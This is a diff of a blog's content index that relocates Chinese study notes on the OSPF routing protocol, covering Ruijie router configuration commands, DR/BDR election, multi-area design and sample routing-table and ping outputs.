+</li>
+</ul>
+<pre class="language-none"><code class="language-none">PC1&gt;ping 192.168.1.1
+Pinging 192.168.1.1 with 32 bytes of data:
+Reply from 192.168.1.1: bytes&#x3D;32 time&#x3D;2ms TTL&#x3D;125
+Reply from 192.168.1.1: bytes&#x3D;32 time&#x3D;1ms TTL&#x3D;125
+Reply from 192.168.1.1: bytes&#x3D;32 time&#x3D;3ms TTL&#x3D;125
+Reply from 192.168.1.1: bytes&#x3D;32 time&#x3D;3ms TTL&#x3D;125
+Ping statistics for 192.168.1.1:
+Packets: Sent &#x3D; 4, Received &#x3D; 4, Lost &#x3D; 0 (0% loss),
+Approximate round trip times in milli-seconds:
+Minimum &#x3D; 1ms, Maximum &#x3D; 3ms, Average &#x3D; 2ms</code></pre>
+
+<pre class="language-none"><code class="language-none">PC1&gt;ping 192.168.1.1
+Pinging 192.168.1.1 with 32 bytes of data:
+Reply from 192.168.1.1: bytes&#x3D;32 time&#x3D;2ms TTL&#x3D;125
+Reply from 192.168.1.1: bytes&#x3D;32 time&#x3D;1ms TTL&#x3D;125
+Reply from 192.168.1.1: bytes&#x3D;32 time&#x3D;3ms TTL&#x3D;125
+Reply from 192.168.1.1: bytes&#x3D;32 time&#x3D;3ms TTL&#x3D;125
+Ping statistics for 192.168.1.1:
+Packets: Sent &#x3D; 4, Received &#x3D; 4, Lost &#x3D; 0 (0% loss),
+Approximate round trip times in milli-seconds:
+Minimum &#x3D; 2ms, Maximum &#x3D; 3ms, Average &#x3D; 2ms</code></pre>
+
+<h3 id="单区域OSPF案例-——-状态查看"><a href="#单区域OSPF案例-——-状态查看" class="headerlink" title="单区域OSPF案例 —— 状态查看"></a>单区域OSPF案例 —— 状态查看</h3><ul>
+<li>查看OSPF 协议状态：show ip protocols <ul>
+<li>FULL&#x2F;BDR ：表示邻接状态已经建立，并且此时本路由器为BDR角色</li>
+</ul>
+</li>
+<li>查看OSPF邻居表：show ip ospf neighbor</li>
+</ul>
+<pre class="language-none"><code class="language-none">R2#show ip protocols 
+Routing Protocol is &quot;ospf 10&quot;
+Outgoing update filter list for all interfaces is not set
+Incoming update filter list for all interfaces is not set
+Router ID 10.2.0.1
+Memory Overflow is enabled
+Router is not in overflow state now
+Number of areas in this router is 1: 1 normal 0 stub 0 nssa
+Routing for Networks:
+10.1.0.2 0.0.0.0 area 0
+10.2.0.1 0.0.0.0 area 0
+Reference bandwidth unit is 100 mbps
+Distance: (default is 110)</code></pre>
+
+<pre class="language-none"><code class="language-none">R2#show ip ospf neighbor
+Neighbor ID Pri State BFD State Dead Time Address Interface
+172.16.2.254 1 Full&#x2F;DR - 00:00:37 10.1.0.1 GigabitEthernet 0&#x2F;0
+192.168.1.254 1 Full&#x2F;DR - 00:00:34 10.2.0.2 GigabitEthernet 0&#x2F;1</code></pre>
+
+<ul>
+<li>查看接口OSPF相关信息： Show ip ospf interface XX</li>
+</ul>
+<pre class="language-none"><code class="language-none">R2#Show ip ospf interface gigabitEthernet 0&#x2F;1
+GigabitEthernet 0&#x2F;1 is up, line protocol is up
+Internet Address 10.2.0.1&#x2F;30, Ifindex 2, Area 0.0.0.0, MTU 1500
+Matching network config: 10.2.0.1&#x2F;32
+Process ID 10, Router ID 10.2.0.1, Network Type BROADCAST, Cost: 1
+Transmit Delay is 1 sec, State BDR, Priority 1
+Designated Router (ID) 192.168.1.254, Interface Address 10.2.0.2
+Backup Designated Router (ID) 10.2.0.1, Interface Address 10.2.0.1
+Timer intervals configured, Hello 10, Dead 40, Wait 40, Retransmit 5
+Hello due in 00:00:08
+Neighbor Count is 1, Adjacent neighbor count is 1
+Crypt Sequence Number is 768
+Hello received 50 sent 55, DD received 3 sent 6
+LS-Req received 1 sent 1, LS-Upd received 4 sent 3
+LS-Ack received 2 sent 3, Discarded 0</code></pre>
+
+
+
+<h3 id="多区域OSPF案例"><a href="#多区域OSPF案例" class="headerlink" title="多区域OSPF案例"></a>多区域OSPF案例</h3><ul>
+<li>OSPF路由案例2需求： <ul>
+<li>在三台路由器上配置OSPF路由，配置OSPF进程号为10</li>
+<li>按照拓扑图配置OSPF区域，使PC1和PC2能ping通PC3</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154736.png" alt="21" loading="lazy"></p>
+<h3 id="多区域OSPF案例-——-基本配置"><a href="#多区域OSPF案例-——-基本配置" class="headerlink" title="多区域OSPF案例 —— 基本配置"></a>多区域OSPF案例 —— 基本配置</h3><ul>
+<li><p>启动OSPF进程： </p>
+<ul>
+<li>Router(config)# router ospf 进程号</li>
+</ul>
+</li>
+<li><p>配置OSPF运行的接口以及接口的区域ID ：</p>
+<ul>
+<li>Router (config-router)# network 网络号 反掩码 area 区域id</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1(config)#router ospf 10
+R1(config-router)#network 172.16.2.254 0.0.0.0 area 1
+R1(config-router)#network 172.16.1.254 0.0.0.0 area 1
+R1(config-router)#network 10.1.0.1 0.0.0.0 area 1</code></pre>
+
+<pre class="language-none"><code class="language-none">R2(config)#router ospf 10
+R2(config-router)#network 10.1.0.2 0.0.0.0 area 1
+R2(config-router)#network 10.2.0.1 0.0.0.0 area 0</code></pre>
+
+<pre class="language-none"><code class="language-none">R3(config)#router ospf 10
+R3(config-router)#network 10.2.0.2 0.0.0.0 area 0
+R3(config-router)#network 10.3.0.254 0.0.0.0 area 0</code></pre>
+
+<h3 id="多区域OSPF案例-——-路由表"><a href="#多区域OSPF案例-——-路由表" class="headerlink" title="多区域OSPF案例 —— 路由表"></a>多区域OSPF案例 —— 路由表</h3></li>
+<li><p>使用特权用户模式命令show ip route，显示IP路由表</p>
+<ul>
+<li>“O”表示区域内部路由 </li>
+<li>“O IA”表示区域间路由</li>
+</ul>
+</li>
+<li><p>查看R1、R2和R3的路由表</p>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1#show ip route
+C 10.1.0.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+C 10.1.0.1&#x2F;32 is local host. 
+O IA 10.2.0.0&#x2F;30 [110&#x2F;2] via 10.1.0.2, 00:00:19, GigabitEthernet 0&#x2F;1
+C 172.16.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;0
+C 172.16.1.254&#x2F;32 is local host. 
+C 172.16.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;2
+C 172.16.2.254&#x2F;32 is local host. 
+O IA 192.168.1.0&#x2F;24 [110&#x2F;3] via 10.1.0.2, 00:00:19, GigabitEthernet 0&#x2F;1</code></pre>
+
+<pre class="language-none"><code class="language-none">R2#show ip route
+C 10.1.0.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
+C 10.1.0.2&#x2F;32 is local host. 
+C 10.2.0.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+C 10.2.0.1&#x2F;32 is local host. 
+O 172.16.1.0&#x2F;24 [110&#x2F;2] via 10.1.0.1, 00:01:07, GigabitEthernet 0&#x2F;0
+O 172.16.2.0&#x2F;24 [110&#x2F;2] via 10.1.0.1, 00:01:07, GigabitEthernet 0&#x2F;0
+O 192.168.1.0&#x2F;24 [110&#x2F;2] via 10.2.0.2, 00:15:52, GigabitEthernet 0&#x2F;1</code></pre>
+
+<pre class="language-none"><code class="language-none">R3#show ip route
+O IA 10.1.0.0&#x2F;30 [110&#x2F;2] via 10.2.0.1, 00:01:45, GigabitEthernet 0&#x2F;0
+C 10.2.0.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
+C 10.2.0.2&#x2F;32 is local host. 
+O IA 172.16.1.0&#x2F;24 [110&#x2F;3] via 10.2.0.1, 00:01:36, GigabitEthernet 0&#x2F;0
+O IA 172.16.2.0&#x2F;24 [110&#x2F;3] via 10.2.0.1, 00:01:36, GigabitEthernet 0&#x2F;0
+C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;1
+C 192.168.1.254&#x2F;32 is local host.</code></pre>
+
+<h3 id="多区域OSPF案例-——-连通性测试"><a href="#多区域OSPF案例-——-连通性测试" class="headerlink" title="多区域OSPF案例 —— 连通性测试"></a>多区域OSPF案例 —— 连通性测试</h3><ul>
+<li>测试网络连通性 <ul>
+<li>PC1和PC2能ping通PC3</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">PC1&gt;ping 192.168.1.1
+Pinging 192.168.1.1 with 32 bytes of data:
+Reply from 192.168.1.1 : bytes&#x3D;32 time&#x3D;2ms TTL&#x3D;125
+Reply from 192.168.1.1 : bytes&#x3D;32 time&#x3D;1ms TTL&#x3D;125
+Reply from 192.168.1.1 : bytes&#x3D;32 time&#x3D;3ms TTL&#x3D;125
+Reply from 192.168.1.1 : bytes&#x3D;32 time&#x3D;3ms TTL&#x3D;125
+Ping statistics for 10.3.0.1:
+Packets: Sent &#x3D; 4, Received &#x3D; 4, Lost &#x3D; 0 (0% loss),
+Approximate round trip times in milli-seconds:
+Minimum &#x3D; 1ms, Maximum &#x3D; 3ms, Average &#x3D; 2ms</code></pre>
+
+<pre class="language-none"><code class="language-none">PC2&gt;ping 192.168.1.1
+Pinging 192.168.1.1 with 32 bytes of data:
+Reply from 192.168.1.1 : bytes&#x3D;32 time&#x3D;2ms TTL&#x3D;125
+Reply from 192.168.1.1 : bytes&#x3D;32 time&#x3D;1ms TTL&#x3D;125
+Reply from 192.168.1.1 : bytes&#x3D;32 time&#x3D;3ms TTL&#x3D;125
+Reply from 192.168.1.1 : bytes&#x3D;32 time&#x3D;3ms TTL&#x3D;125
+Ping statistics for 10.3.0.1:
+Packets: Sent &#x3D; 4, Received &#x3D; 4, Lost &#x3D; 0 (0% loss),
+Approximate round trip times in milli-seconds:
+Minimum &#x3D; 1ms, Maximum &#x3D; 3ms, Average &#x3D; 2ms</code></pre>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>锐捷</category>
+      </categories>
+      <tags>
+        <tag>锐捷</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PPP协议原理与配置</title>
     <url>/posts/cea6a88e/</url>
     <content><![CDATA[<div class="danger">
@@ -3240,504 +3738,6 @@ Received 23358 broadcasts, 0 runts, 0 giants
       </tags>
   </entry>
   <entry>
-    <title>OSPF基础</title>
-    <url>/posts/2400a6ce/</url>
-    <content><![CDATA[<div class="danger">
-
-<blockquote>
-<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
-</blockquote>
-</div>
-
-
-
-<br>
-
-<br>
-
-<p>OSPF协议，全称开放最短路径优先协议（ Open Shortest Path First ），它是IETF组织开发的一个基于 链路状态的内部网关路由协议（IGP）。因其的开放性以及丰富的功能特性，成为目前业内使用最广泛的 路由协议之一</p>
-<h2 id="OSPF的基本概念"><a href="#OSPF的基本概念" class="headerlink" title="OSPF的基本概念"></a>OSPF的基本概念</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ul>
-<li>专为TCP&#x2F;IP网络设计，支持VLSM、路由汇总、等价负载均衡、区域划分、认证 </li>
-<li>OSPF在RGOS平台上的管理距离（AD）是110 </li>
-<li>OSPF报文封装在IP报文中，IP协议号为89 </li>
-<li>OSPF具有无环路、收敛快、扩展性好，可适应大规模网络 </li>
-<li>OSPF目前应用中有两个版本： <ul>
-<li>V2：适用于IPv4 </li>
-<li>V3：扩展支持IPv6</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154540.png" alt="1" loading="lazy"></p>
-<h3 id="OSPF的Cost值"><a href="#OSPF的Cost值" class="headerlink" title="OSPF的Cost值"></a>OSPF的Cost值</h3><ul>
-<li><p>OSPF的接口开销（Cost）计算方式：基于物理链路的带宽来计算度量值 </p>
-<ul>
-<li>Cost&#x3D;默认计算基数&#x2F;物理链路带宽（Bit为单位），默认计算基数&#x3D; 108 bit&#x3D;100M<ul>
-<li>100M带宽的接口，Cost值就是1 </li>
-<li>10M带宽的接口，Cost值就是10</li>
-</ul>
-</li>
-<li>如结果出现小数，会舍弃小数部分取整（如果整数部分为0，则Cost值记为1）， 例如带宽是1000M的链路， Cost值也是1</li>
-</ul>
-</li>
-<li><p>OSPF路由条目的Cost值&#x3D;路由的原始Cost值和沿途入向接口Cost值的累</p>
-</li>
-<li><p>如图，当10.1.0.0&#x2F;24访问10.2.0.0&#x2F;24时，数据从F0&#x2F;1出去，这是一条次优路径！ </p>
-</li>
-<li><p>修改Cost值解决.</p>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154547.png" alt="2" loading="lazy"></p>
-<ul>
-<li>方案一：在OSPF进程中可以修改度量值计算基数来避免这种问题。命令中的1000代表默认计算基数1000M</li>
-</ul>
-  <pre class="language-none"><code class="language-none">Ruijie(config)#router ospf 10
-Ruijie(config-router)#auto-cost reference-bandwidth 1000</code></pre>
-
-<ul>
-<li>方案二：在接口下，使用该命令，直接修改Cost值为200，来影响OSPF路径计算结果</li>
-</ul>
-  <pre class="language-none"><code class="language-none">uijie(config)#int f0&#x2F;1
-Ruijie(config-if)#ip ospf cost 200</code></pre>
-
-<h2 id="OSPF邻居建立的过程"><a href="#OSPF邻居建立的过程" class="headerlink" title="OSPF邻居建立的过程"></a>OSPF邻居建立的过程</h2><h3 id="OSPF相关术语"><a href="#OSPF相关术语" class="headerlink" title="OSPF相关术语"></a>OSPF相关术语</h3><ul>
-<li>Router-ID：在AS中唯一标识一台运行OSPF的路由器的编号 <ul>
-<li>AS（自治系统 Autonomous System） ：使用同一种路由协议一组路由器所构成的一套系统 </li>
-<li>每个运行OSPF的路由器都必须有一个Router ID，同一个AS内，Router-ID不能重复 </li>
-<li>Router-ID可以手动命令配置，也可以系统自动选举</li>
-</ul>
-</li>
-<li>邻居（Neighbor）：两台运行OSPF协议的路由器，从它们相连的接口上会相互发出各自的OSPF参数， 如果双方的参数符合建立邻居的条件，就会形成邻居关系 </li>
-<li>邻接（Adjacency）：邻居不一定邻接。如果两台路由设备之间交换链路状态信息，并根据更新后的数据库计算 出OSPF路由，才能称为邻接关系</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154600.png" alt="3" loading="lazy"></p>
-<h3 id="Router-ID"><a href="#Router-ID" class="headerlink" title="Router ID"></a>Router ID</h3><ul>
-<li>在没有手工指定的情况下（手工指定，直接成为Route ID）<ul>
-<li>如果本地有激活的Loopback接口，则取Loopback接口IP最大值作为OSPF Router-ID </li>
-<li>如果没有Loopback接口，则取活跃的物理接口IP地址中的最大值</li>
-</ul>
-</li>
-<li>项目实施中，一般先创建loopback接口并配置IP地址，随后手工指定OSPF Router-ID为该接口地址</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154604.png" alt="4" loading="lazy"></p>
-<h3 id="OSPF的五种报文类型"><a href="#OSPF的五种报文类型" class="headerlink" title="OSPF的五种报文类型"></a>OSPF的五种报文类型</h3><ul>
-<li>有5种不同OSPF报文类型，这些报文类型用从1到5的类型号标识</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154616.png" alt="5" loading="lazy"></p>
-<h3 id="OSPF邻居建立的三个阶段"><a href="#OSPF邻居建立的三个阶段" class="headerlink" title="OSPF邻居建立的三个阶段"></a>OSPF邻居建立的三个阶段</h3><ul>
-<li>邻居发现，形成邻居：（成功的标志：2-Way状态） <ul>
-<li>通过Hello报文发现并形成邻居关系 </li>
-<li>形成邻居表</li>
-</ul>
-</li>
-<li>形成邻接，路由通告：（成功的标志：Full状态，LSDB同步） <ul>
-<li>邻接路由器之间通过LSU洪泛LSA，通告拓扑信息 </li>
-<li>通过DBD、LSR、LSACK辅助LSA的同步</li>
-<li>最终同一个区域内所有路由器LSDB完全相同</li>
-</ul>
-</li>
-<li>路由计算阶段： <ul>
-<li>LSDB同步后，每台路由器独立进行SPF运算</li>
-<li>把计算出的最佳路由信息放进路由表</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154621.png" alt="6" loading="lazy"></p>
-<h3 id="OSPF常用的三张状态表"><a href="#OSPF常用的三张状态表" class="headerlink" title="OSPF常用的三张状态表"></a>OSPF常用的三张状态表</h3><ul>
-<li>邻居表（Neighbor Table）： <ul>
-<li>通过Hello报文形成邻居	</li>
-<li>用邻居机制来维持路由 </li>
-<li>邻居表存储双向通信的OSPF路由器列表信息</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">R2#show ip ospf neighbor 
-Neighbor ID Pri State Dead Time Address Interface
-172.16.2.254 0 FULL&#x2F; - 00:00:33 10.1.0.1 Serial0&#x2F;1&#x2F;0
-10.3.0.254 1 FULL&#x2F;BDR 00:00:31 10.2.0.2 FastEthernet0&#x2F;0</code></pre>
-
-
-
-
-
-<ul>
-<li>链路状态数据库（LSDB）： <ul>
-<li>通过LSU报文更新LSDB </li>
-<li>描述拓扑信息的LSA存储在LSDB中</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">R2#show ip ospf database 
-OSPF Router with ID (10.2.0.1) (Process ID 10)
-Router Link States (Area 0)
-Link ID ADV Router Age Seq# Checksum Link count
-172.16.2.254 172.16.2.254 352 0x80000004 0x00097c 4
-10.2.0.1 10.2.0.1 310 0x80000004 0x005554 3
-10.3.0.254 10.3.0.254 310 0x80000003 0x006a97 2
-Net Link States (Area 0)
-Link ID ADV Router Age Seq# Checksum
-10.2.0.1 10.2.0.1 310 0x80000001 0x004303</code></pre>
-
-
-
-<ul>
-<li>路由表（RIB）： <ul>
-<li>OSPF计算出来的路由将会加载到路由表 </li>
-<li>路由优先级 O&gt;O IA&gt;[O E1&#x2F;N1]&gt;[O E2&#x2F;N2]</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">R2#show ip route 
-O 10.3.0.0 [110&#x2F;2] via 10.2.0.2, 00:06:42, FastEthernet0&#x2F;0
-O 172.16.1.0 [110&#x2F;65] via 10.1.0.1, 00:07:27, Serial0&#x2F;1&#x2F;0
-O 172.16.2.0 [110&#x2F;65] via 10.1.0.1, 00:07:27, Serial0&#x2F;1&#x2F;0</code></pre>
-
-
-
-<h3 id="OSPF的邻居发现过程"><a href="#OSPF的邻居发现过程" class="headerlink" title="OSPF的邻居发现过程"></a>OSPF的邻居发现过程</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154626.png" alt="7" loading="lazy"></p>
-<h3 id="OSPF的链路状态摘要交换过程"><a href="#OSPF的链路状态摘要交换过程" class="headerlink" title="OSPF的链路状态摘要交换过程"></a>OSPF的链路状态摘要交换过程</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154631.png" alt="8" loading="lazy"></p>
-<h3 id="OSPF的详细链路状态信息同步过程"><a href="#OSPF的详细链路状态信息同步过程" class="headerlink" title="OSPF的详细链路状态信息同步过程"></a>OSPF的详细链路状态信息同步过程</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154635.png" alt="9" loading="lazy"></p>
-<h3 id="OSPF的路由计算与路由表加载"><a href="#OSPF的路由计算与路由表加载" class="headerlink" title="OSPF的路由计算与路由表加载"></a>OSPF的路由计算与路由表加载</h3><ul>
-<li>每台OSPF路由器都会使用SPF算法，根据自己的LSDB独立地计算去往每个目的网络的最短路径 <ul>
-<li>同步后，同一区域的OSPF路由器，LSDB一定是相同的</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154642.png" alt="10" loading="lazy"></p>
-<h2 id="OSPF的网络类型"><a href="#OSPF的网络类型" class="headerlink" title="OSPF的网络类型"></a>OSPF的网络类型</h2><h3 id="广播型多路访问网络-Broadcast"><a href="#广播型多路访问网络-Broadcast" class="headerlink" title="广播型多路访问网络-Broadcast"></a>广播型多路访问网络-Broadcast</h3><ul>
-<li>以太网接口之下，默认的OSPF网络类型为Broadcast </li>
-<li>OSPF在广播多路访问的网络上，会进行DR（Designated Router指定路由器）与BDR（Backup Designated Router）的选举 <ul>
-<li>DR与BDR的能够与该链路上其他路由器（DR other）建立邻接关系，进入Full状态 </li>
-<li>DR other之间建立邻居，停留在2-way状态，不会交换LSA</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154646.png" alt="11" loading="lazy"></p>
-<h3 id="OSPF的DR、BDR机制"><a href="#OSPF的DR、BDR机制" class="headerlink" title="OSPF的DR、BDR机制"></a>OSPF的DR、BDR机制</h3><ul>
-<li>DR、BDR的机制减少了在同一广播域中邻接的数量，减少了广播网络中LSA的泛洪，节省带宽 </li>
-<li>例如下图的案例中<ul>
-<li>如果两两建立邻接需要15对邻接【排列组合，C（6，2）&#x3D;15】 </li>
-<li>如果DR机制，只需要8对邻接</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154653.png" alt="12" loading="lazy"></p>
-<h3 id="OSPF的DR、BDR的选举"><a href="#OSPF的DR、BDR的选举" class="headerlink" title="OSPF的DR、BDR的选举"></a>OSPF的DR、BDR的选举</h3><ul>
-<li><p>优先级高的成为DR，其次成为BDR </p>
-<ul>
-<li>Hello报文携带路由设备优先级，默认&#x3D;1 </li>
-<li>优先级为0的路由设备不具备选举资格，未来也不可能为DR或者BDR</li>
-</ul>
-</li>
-<li><p>优先级一致的情况下，Router ID更高的成为DR，第二高的成为BDR </p>
-<ul>
-<li>DR和BDR一旦选定，即使OSPF区域内新增优先级更高的路由设备，DR和BDR也不会重新选举，只有当DR和 BDR都失效后，才参与选举 </li>
-<li>优先级是基于接口的，修改命令如下</li>
-</ul>
-<pre class="language-none"><code class="language-none">(config)#int vlan 10
-(config-if-VLAN 10)#ip ospf priority 10</code></pre></li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154659.png" alt="13" loading="lazy"></p>
-<h3 id="DR-x2F-BDR的选举示例一"><a href="#DR-x2F-BDR的选举示例一" class="headerlink" title="DR&#x2F;BDR的选举示例一"></a>DR&#x2F;BDR的选举示例一</h3><ul>
-<li>R5后来加入网络，虽然它的Router ID比原有的DR和BDR都高，但是出于稳定性的考虑，只能成为 DRother路由器。</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154704.png" alt="14" loading="lazy"></p>
-<h3 id="DR-x2F-BDR的选举示例二"><a href="#DR-x2F-BDR的选举示例二" class="headerlink" title="DR&#x2F;BDR的选举示例二"></a>DR&#x2F;BDR的选举示例二</h3><ul>
-<li>当DR失效时，BDR立刻成为新的DR </li>
-<li>DRother路由器进行竞争，Router ID高成为新BDR</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154708.png" alt="15" loading="lazy"></p>
-<h2 id="OSPF的区域与基本配置"><a href="#OSPF的区域与基本配置" class="headerlink" title="OSPF的区域与基本配置"></a>OSPF的区域与基本配置</h2><h3 id="OSPF的单区域问题"><a href="#OSPF的单区域问题" class="headerlink" title="OSPF的单区域问题"></a>OSPF的单区域问题</h3><ul>
-<li>同一个区域内所有路由器为了LSDB保持完全相同，在链路发生变动的时候需要更新LSA <ul>
-<li>每台路由器都会收到的大量的LSA通告； </li>
-<li>内部某条链路动荡，都会触发全网路由器重新执行SPF算法，导致网络不稳定；</li>
-</ul>
-</li>
-<li>区域内路由无法汇总，需要维护的路由表越来越大，资源消耗过多，性能下降，影响数据转发</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154713.png" alt="16" loading="lazy"></p>
-<h3 id="OSPF的单区域问题解决方案"><a href="#OSPF的单区域问题解决方案" class="headerlink" title="OSPF的单区域问题解决方案"></a>OSPF的单区域问题解决方案</h3><ul>
-<li>把大型网络分隔为多个较小，可管理的单元 ：区域（area）： <ul>
-<li>控制LSA只在区域内洪泛，有效地把拓扑变化控制在区域内，拓扑的变化影响限制在本区域 </li>
-<li>提高了网络的稳定性和的扩展性，有利于组建大规模的网络</li>
-<li>在区域边界可以做路由汇总，减小了路由表</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154717.png" alt="17" loading="lazy"></p>
-<h3 id="OSPF多区域层次化"><a href="#OSPF多区域层次化" class="headerlink" title="OSPF多区域层次化"></a>OSPF多区域层次化</h3><ul>
-<li>OSPF区域可以分为骨干区域和非骨干区域<ul>
-<li>骨干区域：area 0，骨干区域在逻辑上不能被分割；</li>
-<li>非骨干区域：area 0以外的其他区域都是非骨干区域，非骨干区域必须和骨干区域相连</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154721.png" alt="18" loading="lazy"></p>
-<h3 id="OSPF多区域环境路由器类型"><a href="#OSPF多区域环境路由器类型" class="headerlink" title="OSPF多区域环境路由器类型"></a>OSPF多区域环境路由器类型</h3><ul>
-<li>内部路由器IR （ Internal Area Router）：<ul>
-<li>所有接口在同一个Area内 </li>
-<li>同一区域内的内部路由器，LSDB完全相同</li>
-</ul>
-</li>
-<li>区域边界路由器ABR（ Area Border Router）：<ul>
-<li>接口分属于两个或两个以上的区域，并且有一个活动接口属于area 0 </li>
-<li>ABR为它们所连接的每个区域分别维护单独的LSDB </li>
-<li>区域间路由信息必须通过ABR进行传递</li>
-</ul>
-</li>
-<li>自制系统边界路由器ASBR（Auto System Border Router） <ul>
-<li>自制系统边界的路由器，至少有一个接口属于OSPF之外的其他路由协议</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154725.png" alt="19" loading="lazy"></p>
-<h3 id="单区域OSPF案例"><a href="#单区域OSPF案例" class="headerlink" title="单区域OSPF案例"></a>单区域OSPF案例</h3><ul>
-<li>OSPF路由案例1需求 <ul>
-<li>在三台路由器上配置OSPF路由，配置OSPF进程号为10 </li>
-<li>配置OSPF区域全为0，使PC1和PC2能ping通PC3</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154728.png" alt="20" loading="lazy"></p>
-<h3 id="单区域OSPF案例-——-基础配置"><a href="#单区域OSPF案例-——-基础配置" class="headerlink" title="单区域OSPF案例 —— 基础配置"></a>单区域OSPF案例 —— 基础配置</h3><ul>
-<li>启动OSPF进程：<ul>
-<li>(config)# router ospf [process ID]</li>
-</ul>
-</li>
-<li>配置OSPF运行的接口以及接口的区域ID （建议使用精确宣告）：<ul>
-<li>(config-router)# network network mask area [area ID]</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1(config)#router ospf 10
-R1(config-router)#network 172.16.2.254 0.0.0.0 area 0
-R1(config-router)#network 172.16.1.254 0.0.0.0 area 0
-R1(config-router)#network 10.1.0.1 0.0.0.0 area 0</code></pre>
-
-<pre class="language-none"><code class="language-none">R2(config)#router ospf 10
-R2(config-router)#network 10.1.0.2 0.0.0.0 area 0
-R2(config-router)#network 10.2.0.1 0.0.0.0 area 0</code></pre>
-
-<pre class="language-none"><code class="language-none">R3(config)#router ospf 10
-R3(config-router)#network 10.2.0.2 0.0.0.0 area 0
-R3(config-router)#network 10.3.0.254 0.0.0.0 area 0</code></pre>
-
-
-
-<h3 id="单区域OSPF案例-——-路由表"><a href="#单区域OSPF案例-——-路由表" class="headerlink" title="单区域OSPF案例 —— 路由表"></a>单区域OSPF案例 —— 路由表</h3><ul>
-<li>查看R1、R2和R3的路由表 <ul>
-<li>使用特权用户模式命令show ip route，显示IP路由表</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1#show ip route
-C 10.1.0.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-C 10.1.0.1&#x2F;32 is local host. 
-O 10.2.0.0&#x2F;30 [110&#x2F;2] via 10.1.0.2, 00:00:48, GigabitEthernet 0&#x2F;1
-C 172.16.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;0
-C 172.16.1.254&#x2F;32 is local host. 
-C 172.16.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;2
-C 172.16.2.254&#x2F;32 is local host. 
-O 192.168.1.0&#x2F;24 [110&#x2F;3] via 10.1.0.2, 00:00:32, GigabitEthernet 0&#x2F;1</code></pre>
-
-<pre class="language-none"><code class="language-none">R2#show ip route
-C 10.1.0.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
-C 10.1.0.2&#x2F;32 is local host. 
-C 10.2.0.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-C 10.2.0.1&#x2F;32 is local host. 
-O 172.16.1.0&#x2F;24 [110&#x2F;2] via 10.1.0.1, 00:01:25, GigabitEthernet 0&#x2F;0
-O 172.16.2.0&#x2F;24 [110&#x2F;2] via 10.1.0.1, 00:01:25, GigabitEthernet 0&#x2F;0
-O 192.168.1.0&#x2F;24 [110&#x2F;2] via 10.2.0.2, 00:01:12, GigabitEthernet 0&#x2F;1</code></pre>
-
-<pre class="language-none"><code class="language-none">R3#show ip route
